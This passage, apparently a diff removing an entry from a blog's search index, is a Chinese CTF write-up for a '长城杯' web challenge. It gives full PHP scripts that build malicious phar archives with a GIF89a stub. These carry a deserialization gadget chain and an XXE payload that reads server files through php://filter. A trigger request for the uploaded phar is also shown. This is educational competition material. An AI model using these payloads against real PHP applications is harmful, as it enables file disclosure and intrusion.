 <li><img src="/images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(27).png"></li>
 </ul>
 <p>如果是手工操作的话还是要记得对应好端口。<br>不过这个蚁剑最后这些文件是创建成功了，但是连接不上就有点尴尬了.可能是我版本和别人不一样改的也就不行了。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>长城杯Web WP</title>
-    <url>/2023/03/31/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><span id="more"></span>
-<p>访问8000端口，题目给了源码：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
-        <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>php反序列的知识不懂可以先看：<a href="https://blog.csdn.net/qq_64201116/article/details/127234204">https://blog.csdn.net/qq_64201116&#x2F;article&#x2F;details&#x2F;127234204</a><br>看到<code>**class的魔术方法**</code>第一时间想到反序列化<br>但是没有类似于<code>unserialize()</code>的反序列化函数<br>注意到函数<code>is_dir()</code>，这个函数可以触发<code>phar</code>协议，这个phar协议可以触发反序列化<br>phar反序列化知识补充：<a href="http://home.ustc.edu.cn/~xjyuan/blog/2019/11/13/phar-unserialize/">http://home.ustc.edu.cn/~xjyuan&#x2F;blog&#x2F;2019&#x2F;11&#x2F;13&#x2F;phar-unserialize&#x2F;</a><br>但是phar需要有文件上传的点：于是找到了<code>/upload.php</code>这个功能点<br>因此思路就有了：</p>
-<pre class="line-numbers language-info" data-language="info"><code class="language-info">通过链子构造phar文件，上传phar文件后用phar协议读取<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>反序列化的链子很简单：</p>
-<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">TheUse$__destruct() -->MyClass$__invoke-->MyClass$getdir()  //读取文件名称
-TheUse$__destruct() -->MyClass$__invoke-->MyClass$load()     //读取文件内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>构造反序列化链子：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
-        <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token variable">$xml</span><span class="token operator">=</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>
-<span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token delimiter important">?></span></span> 
-<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">
-&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag.php"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
-EOF;
-$payload = new TheUse(new MyClass('./'), 'load', $xml);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="坑点1"><a href="#坑点1" class="headerlink" title="坑点1"></a>坑点1</h2><p>构造函数的时候<code>$xml</code>变量要用</p>
-<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">$xml=&lt;&lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>EOF</span>
-<span class="token attr-name">&lt;?xml</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span> <span class="token attr-name">encoding</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token attr-name">?</span><span class="token punctuation">></span></span> 
-<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">
-&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=./flag.php"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
-EOF;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这种形式定义，不能直接放到构造函数里，我就是死在这</p>
-<h2 id="坑点2"><a href="#坑点2" class="headerlink" title="坑点2"></a>坑点2</h2><p>在xml中读取文件时要用绝对路径读取协议(这里用了php伪协议读取文件:  php filter读文件知识补充<a href="https://blog.csdn.net/qq_64201116/article/details/125926612">https://blog.csdn.net/qq_64201116&#x2F;article&#x2F;details&#x2F;125926612</a>)：</p>
-<p>不用绝对路径的报错图：</p>
-<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/1.png"></p>
-<p>解决方法(使用绝对路径)：</p>
-<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/2.png"></p>
-<h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>payload生成读取文件名的phar文件：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
-     <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> 
-     <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
-         <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
- <span class="token punctuation">&#125;</span>
- <span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
-     <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> 
-     <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
-     <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
-     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
-     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
- <span class="token punctuation">&#125;</span>
-
-
-<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TheUse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getdir'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/var/www/html/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GIF89a'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// phar:[phar.phar][system_get_you_filename]/1.txt</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>运行后上传phar文件<br>然后使用phar协议读取：</p>
-<pre class="line-numbers language-info" data-language="info"><code class="language-info">?f&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phar.phar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/3.png"></p>
-<p>可以看到flag的名称是<code>Maybe_flag_is_here.php</code><br>接下来读取flag：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
-     <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> 
-     <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
-         <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
- <span class="token punctuation">&#125;</span>
- <span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
-     <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> 
-     <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
-     <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
-     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
-     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
- <span class="token punctuation">&#125;</span>
-
-
-<span class="token variable">$xml</span><span class="token operator">=</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>
-<span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token delimiter important">?></span></span> 
-<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">
-&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/Maybe_flag_is_here.php"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
-EOF;
-$payload = new TheUse(new MyClass('/var/www/html'), 'load', $xml);
-$phar = new Phar('phar.phar');
-$phar->startBuffering();
-$phar->setStub('GIF89a'.'<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>');
-$phar->setMetadata($payload);
-$phar->addFromString('1.txt','test'); // phar:[phar.phar][system_get_you_filename]/1.txt
-$phar->stopBuffering();
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>依旧是把生成的phar文件上传,使用phar协议反序列化：</p>
-<pre class="line-numbers language-info" data-language="info"><code class="language-info">?f&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phar.phar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/4.png"></p>
-<p>解码得到flag:<br><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/5.png"></p>
-<p>flag:<code>flag&#123;this-is-flag-for-you&#125;</code></p>
 ]]></content>
       <categories>
         <category>CTF</category>
